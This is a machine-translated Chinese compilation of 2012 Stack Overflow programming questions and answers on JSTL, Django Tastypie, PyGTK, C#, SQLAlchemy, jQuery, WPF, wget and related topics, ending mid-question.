我有一个 jstl 循环，我想格式化表单的日期：输入。我已经尝试了许多我在网上喜欢的建议的排列，但我就是无法让它发挥作用.. 有人可以看看吗？

我已经包含了上下文的完整循环，但问题在于最后一个`<td></td>`块。

```
<c:forEach items="${valueTransactionsModel.transactions}" var="transaction" varStatus="loopStatus">

                        <tr class="${loopStatus.index % 2 == 0 ? 'even' : 'odd'}">
                            <spring:message code="valueTransactions.transactionType" var="transactionTypeLbl" />
                            <tags:dropdown id="transactionTypeId${loopStatus.index}" path="transactions['${loopStatus.index}'].valueTransactionType.id" 
                                fieldName="${transactionTypeLbl}" classStyle="mandatory" items="${transactionTypes}" itemLabel="value"/>
                        </tr>
                        <tr class="${loopStatus.index % 2 == 0 ? 'even' : 'odd'}">
                            <spring:message code="valueTransactions.transactionAmount" var="valueTransactionAmountLbl${loopStatus.index}" />
                            <tags:input id="transactionAmountId${loopStatus.index}" 
                                path="transactions['${loopStatus.index}'].valueTransactionAmount"
                                fieldName="valueTransactionAmountLbl${loopStatus.index}"
                                maxlength="30" classStyle="mandatory" />
                            <spring:message code="valueTransactions.transactionDate"
                                var="valueTransactionDateLbl${loopStatus.index}" />
                            <td>
                                <form:input type="text" path="transactions['${loopStatus.index}'].valueTransactionDate" cssClass="mandatory" value="<fmt:formatDate value="transactions['${loopStatus.index}'].valueTransactionDate"  type="date" pattern="yyyy-MM-dd"/>" />
                            </td>
                        </tr> 

            </c:forEach> 
```

我最近的问题是：

JSPG0055E: 无法从名称 [transactions[] 值 [${loopStatus.index}] 创建 xml 属性

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-07-31T08:41:12.297

不能在另一个 JSP 标记的属性中使用 JSP 标记。将日期格式的结果存储在页面属性中，并使用此页面属性（就像在 Java 中使用变量一样）：

```
<fmt:formatDate value="transactions['${loopStatus.index}'].valueTransactionDate"  
                type="date" 
                pattern="yyyy-MM-dd"
                var="theFormattedDate" />
<form:input type="text" path="..." value="${theFormattedDate}"/> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-02-12T18:02:02.897

在最新版本的 spring JSTL 标签中，您不能将属性值用于 de tah form:input。如果你尝试，你会得到一个`value attribute is not valid for tag <form:input>`错误。

在这种情况下，您必须使用普通的 HTML 输入标记并将路径作为输入的名称来触发绑定到 Spring 表单，如下所示

```
<fmt:formatDate var="fmtDate" value="${form.bean.dateProperty}" pattern="dd/MM/yyyy"/>
<input type="text" name="bean.dateProperty" value="${fmtDate}"/> 
```

丑陋但对我有用！;)

# asp.net-mvc - 报告服务 asp .net mvc razor

> ID：11736151
> 
> 赞同：1
> 
> 时间：2012-07-31T08:36:08.703
> 
> 标签：asp.net-mvc, entity-framework, razor, reporting-services

我们如何在带有 Razor 引擎的 MVC .net Web 应用程序中使用报告服务。我从报告服务开始，任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:46:55.747

看看： http: [//blogs.msdn.com/b/sajoshi/archive/2010/06/16/asp-net-mvc-handling-ssrs-reports-with-reportviewer-part-i.aspx](http://blogs.msdn.com/b/sajoshi/archive/2010/06/16/asp-net-mvc-handling-ssrs-reports-with-reportviewer-part-i.aspx)获取说明关于如何将报表查看器控件与 asp.net MVC 一起使用。

# django - 为什么我不能在 TastyPie Advanced 过滤器定义中向 orm_filters 添加自定义键/值对？

> ID：11736155
> 
> 赞同：1
> 
> 时间：2012-07-31T08:36:21.600
> 
> 标签：django, tastypie

按照此处提供的示例：[https](https://stackoverflow.com/a/10022244/1386588) ://stackoverflow.com/a/10022244/1386588我遇到了提供的示例代码的问题。

我有以下高级过滤器定义：

```
def build_filters(self, filters=None):
        if filters is None:
            filters = {}

        orm_filters = super(TaggedResource, self).build_filters(filters)

        if('query' in filters):
            query = filters['query']
            print query
            qset = (
                    Q(comment__icontains=query) |
                    Q(media_text__icontains=query)
                    )
            orm_filters.extend({'custom': qset}) 
```

我遇到的问题是 orm_filters 是一个字典映射而不是一个列表。因此，我收到错误：

```
"error_message": "'dict' object has no attribute 'extend'" 
```

如果我尝试像使用常规 dict 对象一样添加键和值对：

```
orm_filters['custom'] = qset 
```

当我尝试`return orm_filters`添加“自定义”键后出现以下错误：

```
"error_message": "Cannot resolve keyword 'custom' into field. Choices are: comment, id, media_text, ..." 
```

知道我做错了什么吗？

一段时间以来，我一直在尝试解决此问题，但没有任何运气，在此先感谢您的帮助！

**更新：我认为问题是我尝试覆盖 apply_filters 没有实例化：**

```
def apply_filters(self, request, applicable_filters):
        print 'applied filters'
        if 'custom' in applicable_filters:
            custom = applicable_filters.pop('custom')
        else:
            custom = None

        semi_filtered = super(TaggedResource, self).apply_filters(request, applicable_filters)

        return semi_filtered.filter(custom) if custom else semi_filtered 
```

这可能是我收到无法解析关键字“自定义”错误的原因，因为我希望此处的 apply_filters 方法在从 apply_filters 中获取“自定义”后将其删除。

不确定我的 apply_filters def 有什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:05:50.427

尝试改变：

```
orm_filters.extend({'custom': qset}) 
```

到：

```
orm_filters.update(**qset) 
```

**更新：（**测试代码）

```
def build_filters(self, filters=None):
    filters = filters

    applicable_filters = super(TaggedResource, self).build_filters(filters)

    query = filters.get('query')
    if query:
        qset = (
            Q(comment__icontains=query) |
            Q(media_text__icontains=query)
        )
        applicable_filters['custom'] = qset

    return applicable_filters

def apply_filters(self, request, applicable_filters):
    custom = None
    if 'custom' in applicable_filters:
        custom = applicable_filters.pop('custom')

    semi_filtered = super(TaggedResource, self).apply_filters(request, applicable_filters)

    return semi_filtered.filter(**custom) if custom else semi_filtered 
```

# python - 在python中刷新Gtk.StatusIcon

> ID：11736156
> 
> 赞同：0
> 
> 时间：2012-07-31T08:36:22.680
> 
> 标签：python, gtk, pygtk

我正在尝试编写一个脚本来检查某些事情并在出现问题时在托盘中显示通知。在此示例中，我正在查看文件的年龄。

我似乎无法弄清楚如何在 gtk.main() 运行后更改图标。

```
import os, gtk
from time import time, sleep
from datetime import datetime

class HeartbeatTrayIcon(object):
    """
    Use GTK to create an object in the system tray
    and manipulate icon shown if there is an issue.
    """
    def __init__(self):
        rx = os.path.getmtime("test")
        self.statusIcon = gtk.StatusIcon()
        if (time() - rx) > (60*60*24):
            self.statusIcon.set_from_stock(gtk.STOCK_CANCEL)
        else:
            self.statusIcon.set_from_stock(gtk.STOCK_APPLY)
        self.statusIcon.set_tooltip("Last heartbeat received at %s" % datetime.fromtimestamp(int(rx)).strftime('%H:%M:%S %d-%m-%Y'))

    def tray(self):
        gtk.main()

if __name__ == "__main__":
    i = HeartbeatTrayIcon()
    i.tray() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:35:36.243

您只是在构造函数中检查文件的年龄`HeartbeatTrayIcon`，因此代码只运行一次。

我建议使用[gobject.idle_add()](http://www.pygtk.org/pygtk2reference/gobject-functions.html#function-gobject--idle-add)注册一个执行检查的回调函数。当应用程序空闲时（即队列中不存在更高优先级的事件），将调用该函数：

```
import os, gtk, gobject
from time import time, sleep
from datetime import datetime

class HeartbeatTrayIcon(object):
    """
    Use GTK to create an object in the system tray
    and manipulate icon shown if there is an issue.
    """
    def __init__(self):
        self.statusIcon = gtk.StatusIcon()

    def check(self):
        rx = os.path.getmtime("test")
        if (time() - rx) > (60*60*24):
            self.statusIcon.set_from_stock(gtk.STOCK_CANCEL)
        else:
            self.statusIcon.set_from_stock(gtk.STOCK_APPLY)
        self.statusIcon.set_tooltip("Last heartbeat received at %s" \
            % datetime.fromtimestamp(int(rx)).strftime('%H:%M:%S %d-%m-%Y'))
        return True

    def tray(self):
        gobject.idle_add(self.check)
        gtk.main()

if __name__ == "__main__":
    i = HeartbeatTrayIcon()
    i.tray() 
```

顺便说一句，请注意您的心跳消息似乎没有做您正在寻找的事情：它总是会打印文件的修改时间，而不是最后一次检查的时间。您可能希望将返回的值存储`time()`在变量中并使用它而不是`rx`.

# c# - 创建一个带有标题的 .txt 文件

> ID：11736157
> 
> 赞同：1
> 
> 时间：2012-07-31T08:36:23.550
> 
> 标签：c#, asp.net

我需要创建一个带有标题的文本文件。

目前我正在使用`StreamWriter`它来创建 txt 文件，如果它不可用，但我只需要写入一次标题，因为每次调用此方法时，我都会在 .txt 文件中写入一个新行

下面是我的代码：

```
string line = userID + "\t" + fullname + "\t" + module + "\t" +
              datetime + "\t" + SQLStatement;

string fileExcel, filePath, fileName;
fileExcel = "Audit.txt";
filePath = HttpContext.Current.Server.MapPath("~");
fileName = filePath + "\\" + fileExcel;
System.IO.StreamWriter file = new System.IO.StreamWriter(fileName, true);

file.WriteLine(line);
file.Close(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:39:37.383

```
Boolean writeHeader = (!File.Exists(fileName));

using (StreamWriter file = new StreamWriter(fileName, true))
{
    if (writeHeader)
    {
       file.WriteLine(headerLine);
    }

    file.WriteLine(line);
} 
```

# c#-4.0 - 如何使用实体框架 linq 旋转此表

> ID：11736158
> 
> 赞同：4
> 
> 时间：2012-07-31T08:36:24.003
> 
> 标签：c#-4.0, entity-framework-4, pivot

我的表结构在这里

`Product`表（Repo.Products）
`ID` `ProductName`
`02` `Computer`

`Property`表（Repo.Properties）

`ID` `PropertyName`
`03` `CPU`
`04` `RAM`

`Product Property`表（Repo.ProductProperties）
`ID` `ProductID` `PropertyID` `Value`
`01` `02` `03` `1300`
`02` `02` `04` `1024`

我的目标输出是

`Product Name` `CPU` `RAM`
`Computer` `1300` `1024`

如何使用 Entity Framework 4.0 ？

# html - 使用 base64 编码图像的优缺点

> ID：11736159
> 
> 赞同：55
> 
> 时间：2012-07-31T08:36:26.963
> 
> 标签：html, image, base64

我正在考虑为我正在开发的网站使用 base64 编码图像以优化加载时间。

无论如何，在我开始之前，我想知道：这样做的优点和缺点是什么？

目前，我没有看到任何缺点，但我也注意到它不是一种经常使用的技术，这让我怀疑我是否没有错过什么。

谷歌搜索主题后，我没有发现任何明确的内容，所以我决定在这里问。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-07-31T08:47:44.823

它仅对非常小的图像有用。Base64 编码文件比原始文件大。优点在于不必打开另一个连接并向服务器发出 HTTP 请求以获取图像。这种优势很快就会消失，因此只有大量非常小的单个图像才有优势。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-07-31T08:50:16.447

> 符合 MIME 的 Base64 编码二进制数据的实际长度通常约为原始数据长度的 137%，尽管对于非常短的消息，由于标头的开销，开销可能要高得多。非常粗略地说，Base64 编码的二进制数据的最终大小等于原始数据大小的 1.37 倍 + 814 字节（对于标头）。
> 
> 换句话说，解码数据的大小可以用这个公式来近似：

```
bytes = (string_length(encoded_string) - 814) / 1.37 
```

资料来源：[http ://en.wikipedia.org/wiki/Base64#MIME](http://en.wikipedia.org/wiki/Base64#MIME)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-07-31T08:54:50.593

这篇文章中已经提到了以下一些缺点，在[网站上使用内联/base64 图像比仅链接到硬文件要快多少？](https://stackoverflow.com/questions/1574961/how-much-faster-is-it-to-use-inline-base64-images-for-a-web-site-than-just-linki)

*   大多数形式的缓存都被打败了，如果经常查看图像，这可能会造成很大的伤害 - 例如，显示在每个页面上的徽标，通常可以由浏览器缓存。
*   更多的 CPU 使用率。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-01-22T09:49:30.653

HTML 页面的响应时间也会增加，因为图像在正常情况下会异步加载。即使图像加载较晚，您也可以开始看到文字。

如果仅在 CDN 中缓存媒体，则 CDN 的另一个优势将丧失

这种优势将会丧失。

# python - SQLAlchemy：带有字符串函数的 CheckConstraint

> ID：11736160
> 
> 赞同：0
> 
> 时间：2012-07-31T08:36:30.700
> 
> 标签：python, orm, sqlalchemy, check-constraints

尝试以这种方式使用 sqlalchemy.schema.CheckConstraint ：

```
themes2tags_table = Table('themes2tags', Base.metadata,
    Column('theme_id', String(32), ForeignKey('tags.id')),
    Column('tag_id', String(32), ForeignKey('tags.id')),
    PrimaryKeyConstraint(['theme_id', 'tag_id']),
    CheckConstraint("substr(theme_id,1,1)='3'")) 
```

（显然，这意味着标签表上的多对多自引用关系，并且主题是具有预定义前缀的标签），最终结果是

```
 ...CheckConstraint("substr(theme_id,1,1)='3'")
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 303, in __new__
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 370, in _init
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 64, in _init_items
  File "build\bdist.win32\egg\sqlalchemy\events.py", line 234, in _set_parent_wi
th_dispatch
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 2133, in _set_parent
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 1909, in _set_parent
  File "build\bdist.win32\egg\sqlalchemy\schema.py", line 1883, in _set_parent
  File "build\bdist.win32\egg\sqlalchemy\sql\expression.py", line 2213, in add
AttributeError: 'list' object has no attribute 'key' 
```

我在这里错在哪里？在这种情况下有可能有这样的限制吗？

当前的后端是 sqlite，但我考虑在未来迁移到 Postgres，因此寻找更不通用的收据。

更新：sqlalchemy 0.7.5

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T07:48:46.487

好吧，那是我的错，事实上，基于错误的错误信息。事实证明，实际错误在前一行，即正确的语法是：

```
themes2tags_table = Table('themes2tags', Base.metadata,
    Column('theme_id', String(32), ForeignKey('tags.id')),
    Column('tag_id', String(32), ForeignKey('tags.id')),
    PrimaryKeyConstraint(*['theme_id', 'tag_id']),
    CheckConstraint("substr(theme_id,1,1)='3'")) 
```

请注意 PrimaryKeyConstraint 中列表定义之前的星号。

# ios - RestKit 请求未正确发送

> ID：11736166
> 
> 赞同：0
> 
> 时间：2012-07-31T08:37:00.070
> 
> 标签：ios, restkit

我正在为一个项目使用 restkit 0.10.0。在极少数情况下，应用程序似乎进入了一种状态，即所有通过 restkit 发送的 http 请求都没有得到处理，即它们从未得到处理。我已经通过 github 上的错误，但找不到匹配的错误。

有没有人经历过类似的事情？我查看了[连续 5 次未发送 RestKit 调用，](https://stackoverflow.com/questions/9894267/5th-consecutive-restkit-call-not-being-sent)但无法重现此问题。

编辑：毕竟这可能不是 RestKit 的错。我已经集成了 TestFlight SDK 1.0，[为什么 NSURLConnection 无法到达后端？](https://stackoverflow.com/questions/10149811/why-does-nsurlconnection-fail-to-reach-the-backend)表明它可能会导致 NSURLConnection 不调用成功/错误回调

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:46:57.057

我目前在我的应用程序中使用 RestKit 0.10.1，它会下载某些图像图块以查看不同分辨率级别的图像。所以 RestKit 为我处理了大量的流量，但我从来没有遇到过你提到的问题。您能否提供更多信息或一些控制台输出？您可以随时尝试使用新版本或旧版本的 RestKit，看看问题是否仍然存在。

[RestKit v0.9.3](https://github.com/RestKit/RestKit/wiki/RestKit-0.9.3)

[Restkit v0.10.1](https://github.com/RestKit/RestKit/wiki/Restkit-0.10.1)

# c++ - 如何在 C++ 中从 Internet 下载 xml

> ID：11736170
> 
> 赞同：0
> 
> 时间：2012-07-31T08:37:07.843
> 
> 标签：c++, html, xml, visual-c++, xml-parsing

当您将页面另存为 .xml 或查看页面源代码时，Internet 浏览器执行此操作的方式相同。当然，我的目标是一个 xml 格式的网页，开头是这样的：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

我为什么要这样做？好吧，我想将某些网页的整个源代码转储到一个字符串或 CString 中，我仍在[研究如何去做](https://stackoverflow.com/questions/11734371/how-to-store-entire-source-of-xml-file-as-a-string-in-c)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:04:16.213

既然您提到了 Visual C++，一个好的解决方案是利用 Microsoft Research 最近发布的 HTTP Casablanca 库，前提是您也能够使用 C++11。

[http://msdn.microsoft.com/en-us/devlabs/casablanca.aspx](http://msdn.microsoft.com/en-us/devlabs/casablanca.aspx)

您需要使用 HTTP 客户端，类似于本教程中描述的内容， http: [//msdn.microsoft.com/en-US/devlabs/hh977106.aspx](http://msdn.microsoft.com/en-US/devlabs/hh977106.aspx)

可能是这样的，

```
http_client client( L"http://somewebsite.com" );

client.request( methods::GET, L"page-to-download.html" )
    .then( []( http_response response ) {
        cout << "HTML SOURCE:" << endl << response.to_string() << endl; })
    .wait(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:45:50.053

使用[libcurl](http://curl.haxx.se/libcurl/)：

```
size_t AppendDataToStringCurlCallback(void *ptr, size_t size, size_t nmemb, void *vstring)
{
    std::string * pstring = (std::string*)vstring;
    pstring->append((char*)ptr, size * nmemb);
    return size * nmemb;
}

std::string DownloadUrlAsString(const std::string & url)
{
    std::string body;

    CURL *curl_handle;
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    curl_easy_setopt(curl_handle, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, AppendDataToStringCurlCallback);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &body);
    curl_easy_perform(curl_handle); 
    curl_easy_cleanup(curl_handle);

    return body;
} 
```

# wpf - 用户控件的 DataContext 上的 DataBind，而不是 WPF/MVVM 中的 ListBox

> ID：11736171
> 
> 赞同：2
> 
> 时间：2012-07-31T08:37:11.253
> 
> 标签：wpf, mvvm

我需要将我的 ComboBox 绑定到来自 UserControl 的 DataContext 的“Rayons”属性（而不是包含我的 ComboBox 的 ListView 的 ItemSources）。

我尝试使用 RelativeSource 但它不起作用，并且调试窗口中没有错误消息。

简化代码：

```
<UserControl xmlns:my="clr-UI.View"
             x:Class="UI.View.MontureView"
             xmlns:i="clr-namespace:System.Windows.Interactivity;assembly=System.Windows.Interactivity"
             xmlns:cmd="clr-namespace:GalaSoft.MvvmLight.Command;assembly=GalaSoft.MvvmLight.Extras.WPF4"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             mc:Ignorable="d"
             d:DesignHeight="673" d:DesignWidth="980">
        <ListView ItemsSource="{Binding Path=Monture, Mode=TwoWay}" Margin="0,39,0,95" Height="600" HorizontalAlignment="Center">
            <ListView.View>
                <GridView>
                    <GridViewColumn >
                        <GridViewColumn.CellTemplate >
                            <DataTemplate>
                                <ComboBox Height="25" HorizontalAlignment="Center" Width="125"
                                          Name="comboBoxRay" Margin="0,2,0,3"
                                          ItemsSource="{Binding Path=Rayons,  RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type UserControl}}}"
                                          SelectedValue="{Binding Path=IDRayon, Mode=TwoWay,UpdateSourceTrigger=PropertyChanged}"
                                          DisplayMemberPath="SRAY_LIBELLE"
                                          SelectedValuePath="SRAY_ID"  />
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
                </GridView>
            </ListView.View>
        </ListView>
</UserControl> 
```

我该如何处理这种情况？

我找到了该[文档](http://www.nbdtech.com/Free/WpfBinding.pdf)，但没有帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:43:06.637

有几种方法可以处理这个问题。但首先，如果您没有看到绑定错误，请尝试使用 Snoop 查看是否存在绑定错误。

nevertheless if you use RelativeSource binding your Path should alomost be something like: Path=**DataContext**.Rayons. in your case the binding need a Rayons property on your usercontrol, but there is of course no Rayons property.

the relativesource binding like you did works most time, but when you have a usercontrol in a usercontrol in a usercontrol it becomes difficult ;) is such cases i use **DataContextMarkerInterface**(empty interfaces).

```
public interface IDataContextMarkerRayonsSource {} 
```

then add this interface to your specific usercontrol and change the relativesource binding to AncestorType

```
ItemsSource="{Binding Path=DataContext.Rayons, RelativeSource={RelativeSource AncestorType={x:Type local:IDataContextMarkerRayonsSource }}}" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:42:44.703

你说它：来自的`DataContext`财产`UserControl`。尝试

```
ItemsSource="{Binding Path=DataContext.Rayons,
                      RelativeSource={RelativeSource AncestorType={x:Type UserControl}}}" 
```

# cordova - PhoneGap，相机回调函数未调用

> ID：11736173
> 
> 赞同：1
> 
> 时间：2012-07-31T08:37:16.013
> 
> 标签：cordova, callback, remote-server

我开发了一个使用 PhoneGap 构建的应用程序。它应该拍照（或在图书馆拍照）并将其上传到我们的服务器上。

我可以拍照，但没有调用回调函数。在[这篇文章](https://stackoverflow.com/a/5983608/1565111)中，我看到他也有同样的问题，而且我的应用程序也是基于远程服务器的。但是我没有找到这么多的信息.​​..

谁能证实我他说的？

有什么解决办法吗？

我有义务将我的网页保存在远程服务器上，因为它也像 Web 应用程序一样与 jQuery Mobile 一起使用。PhoneGap 只是用来添加原生功能...

或者我可以调用本地脚本吗？

任何帮助都非常感谢...

谢谢！

编辑：这是一个 iOS 应用程序......我在调试控制台中得到了我想要的结果，但是没有调用回调，所以我无法访问它。

2012-07-31 11:29:45.669 Invokit[1199:707] PluginResult:toJSONString - {"status":1,"message":"{{image_encodedbase64}}","keepCallback":false});

# database - 当应用程序更新数据库时在远程服务器上执行批处理文件

> ID：11736176
> 
> 赞同：0
> 
> 时间：2012-07-31T08:37:28.530
> 
> 标签：database, triggers

当应用程序更新数据库时，我需要在远程服务器上执行批处理文件

在 Web 浏览器/客户端中运行。例如，如果用户单击表单的提交按钮

并且数据被输入数据库，批处理文件应该在服务器上执行，这将

执行某些任务。数据库触发器可以执行此类任务..（我怀疑）...？我希望使用 windows 2008 服务器和 MYSQL 数据库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:41:11.197

这可能会有所帮助：[Invoking a PHP script from a MySQL trigger](https://stackoverflow.com/questions/1467369/invoking-a-php-script-from-a-mysql-trigger)

# jquery - 检测点击指定区域

> ID：11736178
> 
> 赞同：1
> 
> 时间：2012-07-31T08:37:34.643
> 
> 标签：jquery

```
<div id="main">
hello world
<div id="second-div">
bye
</div>
</div>

jQuery('#main:not(second-div)').click(function() {
alert('works!');
}); 
```

我想检测鼠标点击“主”div，但是当我点击“second-div”div 时点击事件不应该触发。我尝试过使用 ":not(second-div)" 但无论如何点击都会触发。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:42:58.107

您可以检查事件的目标属性。*（编辑以反映评论中的改进建议）*

```
jQuery('#main').click(function(e) {
    if(e.target===this) {
        alert("works!");
    }
});​ 
```

[http://jsfiddle.net/rZeXa/](http://jsfiddle.net/rZeXa/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:45:03.857

或者你可以试试这个：http: [//jsfiddle.net/N6G62/](http://jsfiddle.net/N6G62/)

这应该有助于原因`:)`

**代码**

```
$('#main').click(function(e) {

    alert('works!');

});

$('#main div').click(function(e) {
     e.stopPropagation();
});

​ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T08:59:55.673

我知道这很奇怪......

```
$(document).ready(function(){
       $(this).click(function(e){
            if($(e.originalEvent.originalTarget).prop('id')=='main'){  
              alert('You have clicked on Main') 
            }
   })                       
 }); 
```

只是想分享一些我今天学到的东西......

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-31T09:45:41.177

类似于 Daniel 提供的解决方案。我总是`is`这样识别：

```
jQuery('#main').click(function(event) {
  if(!$(event.target).is('#second-div'))
   {
     alert('works');
   }
}); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-31T08:40:28.193

你应该打电话

```
 event.stopPropagation(); 
```

在您的点击处理程序的第一行。这将阻止事件在层次结构中的传播。

# java - JSF2 中的 AjaxBehaviorEvent 与 ActionEvent

> ID：11736186
> 
> 赞同：3
> 
> 时间：2012-07-31T08:38:02.823
> 
> 标签：java, jsf, jakarta-ee, richfaces, ajax4jsf

最近我一直在尝试将我正在开发的这个应用程序从 JSF 1.2 升级到 JSF 2，在这个过程中我遇到了困难，因为你可能已经知道 AjaxBehaviorEvent 对 JSF 来说是全新的，然后又回到了 JSF 1.2 和使用 RichFaces 3 我能够做到以下几点：

在支持 bean 中有一个方法的签名

```
public void onSomeEvent(ActionEvent evt){
    //Process the event
} 
```

我可以在以下两个位置调用此方法，如下所示 1-

```
<h:commandButton actionListener="#{bean.onSomeEvent}" value="Process Event"/> 
```

2-

```
<h:commandButton value="Process Event" >
    <a4j:support event="oncomplete" actionListener="#{bean.onSomeEvent}" />
</h:commandButton> 
```

现在在 JSF 2 中有两种类型的事件，旧的 ActionEvent 和新的 AjaxBehaviorEvent 似乎两者都不能与另一个互换工作，我的意思是如果我要使用 f:ajax 的方法，那么它需要在其参数列表中包含 AjaxBehaviorEvent ，如果我要将它与组件的普通 DHTML 事件一起使用，那么它需要在参数列表中有一个 ActionEvent。

我想知道是否有某种方法可以使用例如我在 JSF 2 中对这两种类型的事件所做的事情。

谢谢你们。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T11:51:22.913

正如@maple_shaft 所建议的那样，我确实设法通过使用EL 2.2 来克服这个问题，我所做的是我从我没有使用它的方法中删除了ActionEvent 参数。

# python - 我可以创建一个行为类似于不可变（浮点）的类吗？

> ID：11736191
> 
> 赞同：2
> 
> 时间：2012-07-31T08:38:16.533
> 
> 标签：python, immutability, inheritance

我有一门课程可以计算可能会改进的移动平均线。平均窗口的大小必须灵活。它目前通过设置窗口大小然后发送更新来工作：

```
twoday = MovingAverage(2)    # twoday.value is None
twoday = twoday.update(10)   # twoday.value is None
twoday = twoday.update(20)   # twoday.value == 15
twoday = twoday.update(30)   # twoday.value == 25 
```

我认为如果它更像这样工作会很酷：

```
twoday = MovingAverage(2)    # twoday is None
twoday += 10                 # twoday is None
twoday += 20                 # twoday == 15
twoday += 30                 # twoday == 25 
```

这是愚蠢的吗？是否可以？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T08:44:13.000

您可以通过添加诸如 的方法来[模拟数字类型](http://docs.python.org/reference/datamodel.html#emulating-numeric-types)`__add__()`，这正是您想要的。

只需添加方法，例如

```
def __iadd__(self, other):
    self.update(other)
    return self

def __add__(self, other):
    return self.value + other

def __str__(self):
    return str(self.value) 
```

到你目前拥有的。

如果您想接近浮点数的功能，可以添加诸如

```
def __float__(self):
    return self.value

def __radd__(self, other):
    return other + self.value 
```

（后者为您提供了一种方法来`somevalue + twoday`获得期望值）

和`__mul__/__rmul__`，与 div 相同，依此类推。您唯一的特殊情况可能是`__iadd__()`上面提到的。

# c# - 在 RichTextBox 中更改字体时更改文本颜色

> ID：11736192
> 
> 赞同：0
> 
> 时间：2012-07-31T08:38:17.687
> 
> 标签：c#, fonts, colors, richtextbox

我在我的 Windows 应用程序中使用 RichTextBox。RichTextBox 的 rtf 有任何颜色的文本。我使用 Combobox 让用户可以更改 RichTextBox 的字体。我的问题是当用户更改字体时，RichTextBox 的所有文本都是黑色的。我怎样才能改变文字的颜色？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:43:38.417

使用 RichTextBox 的 .SelectionFont-Property

更多信息：http: [//msdn.microsoft.com/en-us/library/system.windows.forms.richtextbox.selectionfont.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.richtextbox.selectionfont.aspx)

# http - wget 没有返回正确的页面

> ID：11736194
> 
> 赞同：0
> 
> 时间：2012-07-31T08:38:30.990
> 
> 标签：http, download, wget

当我通过 Firefox 13访问[这个网站时，我得到了一个包含一些内容的页面。](http://tinhvan.com)但是当我使用 wget 下载它时：

```
wget http://tinhvan.com 
```

我在下载的 HTML 页面上获得了其他内容。尝试设置用户代理：

```
wget -U 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1' http://tinhvan.com 
```

但得到了相同的结果。

发生了什么 ？以及如何获得与通过 Firefox 访问时相同的结果？

**更新**

这是来自 Firefox => 查看源代码：

```
<!DOCTYPE html>

<html dir="ltr" lang="vi">  

    <head id="ctl00_page_header">

            <title>

                Tinhvan Group - Trang chủ 
```

并从 wget 下载

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><link href="Content/images/main.css" rel="stylesheet" type="text/css" /><link href="Content/images/mail-detail.css" rel="stylesheet" type="text/css" />
    <script src="../../Content/JqueryUI/js/jquery-1.3.2.min.js" type="text/javascript"></script>    
    <title>

    Trang chủ - Tinhvan Group Website 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-30T11:51:36.023

Firefox（不仅仅是 FF、Chrome、IE 等也可以）自动添加 Accept* 标头。

例如

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US, en;q=0.5 
```

尝试

```
wget --header="Accept: text/html"  -U 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1' http://tinhvan.com 
```

注意：如果您不声明 Accept 标头，则 wget 会自动添加 Accept:*/* 这意味着给我您拥有的任何东西。该站点似乎默认返回 aplication/xhtml+xml，但您期望的是 text/html。

# java - 当到达 main 的结束行时，有多少对象有资格进行垃圾回收？

> ID：11736199
> 
> 赞同：0
> 
> 时间：2012-07-31T08:38:51.447
> 
> 标签：java

我的主要问题是在执行该行时真正创建了多少对象

```
